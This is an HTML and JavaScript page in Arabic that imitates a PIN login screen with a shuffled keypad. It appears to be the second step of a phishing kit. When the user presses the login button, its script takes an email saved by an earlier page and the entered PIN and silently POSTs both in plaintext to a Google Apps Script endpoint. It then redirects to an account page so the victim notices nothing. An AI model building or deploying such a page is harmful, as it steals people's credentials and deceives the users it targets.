<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>الرمز السري</title>
    <style>
        body { 
            font-family: sans-serif; 
            margin: 0; 
            background-color: #EAF0E9; 
            display: flex; 
            justify-content: center; 
            min-height: 100vh; 
        }
        .main-container { 
            width: 100%; 
            max-width: 400px; 
            padding: 40px 20px; 
            box-sizing: border-box; 
        }
        .header-title { 
            font-size: 22px; 
            font-weight: bold; 
            margin-bottom: 25px; 
            text-align: right; 
        }
        
        .password-display {
            width: 100%; 
            padding: 18px; 
            border: 1px solid #c8d1c7; 
            border-radius: 12px;
            font-size: 24px; 
            text-align: right; 
            background-color: #fff; 
            margin-bottom: 15px;
            box-sizing: border-box; 
            height: 60px; 
            outline: none;
            letter-spacing: 8px;
        }

        .login-btn {
            width: 100%; 
            background-color: #ffffff; 
            color: #ccc; 
            border: 1px solid #c8d1c7;
            padding: 16px; 
            border-radius: 15px; 
            font-size: 20px; 
            font-weight: bold;
            cursor: not-allowed; 
            margin-bottom: 30px; 
            transition: 0.3s;
        }
        .login-btn.active { 
            background-color: #2EAF4A; 
            color: #ffffff; 
            border: none; 
            cursor: pointer; 
        }

        .keypad { 
            display: grid; 
            grid-template-columns: repeat(3, 1fr); 
            gap: 10px; 
            background-color: #fff;
            padding: 15px;
            border-radius: 12px;
            border: 1px solid #c8d1c7;
        }
        .key { 
            padding: 20px 0; 
            text-align: center; 
            font-size: 24px; 
            font-weight: bold; 
            background-color: #f9f9f9;
            cursor: pointer; 
            user-select: none; 
            border-radius: 8px;
        }
        .key:active { background-color: #e0e0e0; }
    </style>
</head>
<body>

<div class="main-container">
    <div class="header-title">الرمز السري</div>
    
    <input type="password" id="passInput" class="password-display" placeholder="إدخل الرمز السري" readonly>
    
    <button id="finalBtn" class="login-btn" disabled onclick="sendData()">ولوج</button>

    <div class="keypad" id="keypad"></div>
</div>

<script>
    let currentPass = "";
    // الرابط الخاص بك الذي زودتني به
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwyQ4bmCc15izyIM0opYzcuXBvdVdoI9eeiTzuPIDNpj0o0NpzbneYHI3dPv6RLPfDS/exec';

    function generateKeypad() {
        let nums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].sort(() => Math.random() - 0.5);
        const keypad = document.getElementById('keypad');
        keypad.innerHTML = "";
        
        nums.forEach(num => {
            const keyDiv = document.createElement('div');
            keyDiv.className = 'key';
            keyDiv.innerText = num;
            keyDiv.onclick = () => {
                if (currentPass.length < 6) {
                    currentPass += num;
                    document.getElementById('passInput').value = "*".repeat(currentPass.length);
                    updateButton();
                }
            };
            keypad.appendChild(keyDiv);
        });
    }

    function updateButton() {
        const btn = document.getElementById('finalBtn');
        if(currentPass.length >= 4) {
            btn.disabled = false;
            btn.classList.add('active');
        }
    }

    async function sendData() {
        // سحب الإيميل الذي تم حفظه في الصفحة الأولى
        const email = localStorage.getItem('storedEmail');
        const btn = document.getElementById('finalBtn');
        
        if (!email) {
            alert("خطأ: لم يتم العثور على البريد. يرجى العودة للصفحة الأولى.");
            window.location.href = "../";
            return;
        }

        btn.innerText = "جاري الحفظ...";
        btn.disabled = true;

        try {
            // إرسال البيانات (إيميل + باسورد) للسكريبت
            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ 
                    email: email, 
                    password: currentPass 
                })
            });

            // التوجيه لصفحة الحساب
            setTimeout(() => {
                window.location.href = "../UserAccountSystem/Account/";
            }, 1000);

        } catch (error) {
            window.location.href = "../UserAccountSystem/Account/";
        }
    }

    window.onload = generateKeypad;
</script>
</body>
</html>
